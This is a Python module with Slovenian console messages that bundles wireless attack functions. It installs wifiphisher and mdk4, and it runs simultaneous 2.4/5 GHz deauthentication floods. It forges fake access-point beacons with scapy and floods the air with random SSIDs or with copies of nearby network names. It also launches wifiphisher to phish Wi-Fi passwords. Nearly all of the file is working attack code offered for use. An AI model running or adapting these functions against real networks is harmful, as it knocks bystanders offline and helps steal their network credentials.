# functions.py
import subprocess
import pandas as pd
import threading
import keyboard
from scapy.all import *
import signal
import sys

def install_dependencies(): 
    apt = 'sudo apt install -y wifiphisher mdk4'
    pip = 'pip install pandas keyboard scapy'
    try:
        print("Začenjam namestitev paketov preko apt...")
        subprocess.run(apt, shell=True, check=True)
        print("Namestitev paketov preko apt je uspešna.")
    except subprocess.CalledProcessError as e:
        print("E: Sub-process /usr/bin/dpkg returned an error code (1)")
        print(f"Prišlo je do napake med izvajanjem ukaza: {e}")
    except Exception as e:
        print(f"Nepredvidena napaka: {e}")
    
    try:
        print("Začenjam namestitev paketov preko pip...")
        subprocess.run(pip, shell=True, check=True)
        print("Namestitev paketov preko pip je uspešna.")
    except subprocess.CalledProcessError as e:
        print(f"Prišlo je do napake med izvajanjem ukaza: {e}")
    except Exception as e:
        print(f"Nepredvidena napaka: {e}")



def prepare_interfaces():
    result = subprocess.run(['sudo', 'airmon-ng'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')
    print(output)
    choice = 'i'
    while choice != 'e':
        choice = input('Input network interface to put into monitor mode(to exit press e): ')
        subprocess.run(['sudo', 'airmon-ng', 'start', choice], stdout=subprocess.PIPE)
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')
    print(output)

def program_stop():
    print(" ")

def get_wifi_networks():
    result = subprocess.run(['nmcli', '-f', 'BSSID,SSID,CHAN', 'dev', 'wifi', 'list', 'ifname', 'wlan0'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')

    lines = output.splitlines()

    bssid_list = []
    ssid_list = []
    chan_list = []
    for line in lines[1:]:
        parts = line.split()
        if len(parts) >= 3:  # Ensure there are at least 3 parts (BSSID, SSID, CHAN)
            bssid_list.append(parts[0])
            ssid_list.append(" ".join(parts[1:-1]))
            chan_list.append(parts[-1])
        else:
            print(f"Skipping malformed line: {line}")

    wifi_df = pd.DataFrame({
        'BSSID': bssid_list,
        'SSID': ssid_list,
        'CHAN': chan_list
    })

    return wifi_df

def mdk4_deauth_attack_dualband(wlan1, wlan2):
    def mdk4_deauth(wlan, ch):
        command = f"sudo mdk4 {wlan} d -c {ch}"
        try:
            subprocess.run(command, shell=True)
        except KeyboardInterrupt:
            print(f"Prekinjeno izvajanje za {wlan} na kanalu {ch}.")


    print(get_wifi_networks())
    ch2G = input('Channel 1: ')
    ch5G = input('Channel 2: ')

    try:
        thread1 = threading.Thread(target=mdk4_deauth, args=(wlan1, ch2G))
        thread2 = threading.Thread(target=mdk4_deauth, args=(wlan2, ch5G))

        thread1.start()
        thread2.start()

        thread1.join()
        thread2.join()
    except KeyboardInterrupt:
        print("Program prekinjen s strani uporabnika. Ukazi mdk4 se zaključujejo...")
        thread1.join()
        thread2.join()

    print("Oba ukaza sta bila izvedena.")

def scapy_fake_ap(wlan):
    channel  = 6
    mac_address = '5C:A6:E6:4D:71:66'
    #networks = get_wifi_networks()
    #ssid = networks['SSID'].tolist()
    ssid = ['1', '2', '3']
    inter=0.01
    count=5
    loops = 1000
    for i in range (0, loops):
        for ap in ssid:
            beacon = (
                RadioTap()/
                Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac_address, addr3=mac_address)/
                Dot11Beacon(cap="ESS+privacy")/
                Dot11Elt(ID="SSID", info=ap, len=len(ap))/
                Dot11Elt(ID="DSset", info=chr(channel))/
                Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x0c\x12\x18\x24')/
                Dot11Elt(ID="ESRates", info='\x30\x48\x60\x6c')
            )

            # Pošiljanje paketov v zanki
            print(f"[INFO] Začel ustvarjati lažno dostopno točko '{ssid}' na kanalu {channel} z MAC naslovom {mac_address}")
            sendp(beacon, iface=wlan, inter=inter, count=count)

def mdk4_beacon_flood_random(wlan):   
    command = f"sudo mdk4 {wlan} b -s 500000"
    try:
        subprocess.run(command, shell=True)
    except KeyboardInterrupt:
        print(f"Prekinjeno izvajanje za {wlan} na kanalu {ch}.")

def mdk4_beacon_flood_multiply(wlan):
    multiply = int(input('Input network multiplication: '))
    networks = get_wifi_networks()
    networks = networks["SSID"].tolist()
    networks = sorted(networks*multiply)
    filename = 'beacons.txt'
    with open(filename, 'w') as file:
        for ssid in networks:
            file.write(f"{ssid}\n")
    file.close()
    command = f"sudo mdk4 {wlan} b -s 500000 -f beacons.txt"
    try:
        subprocess.run(command, shell=True)
    except KeyboardInterrupt:
        print(f"Prekinjeno izvajanje za {wlan}.")
            
def wifi_phishing():
    command = "sudo wifiphisher"
    subprocess.run(command, shell=True)
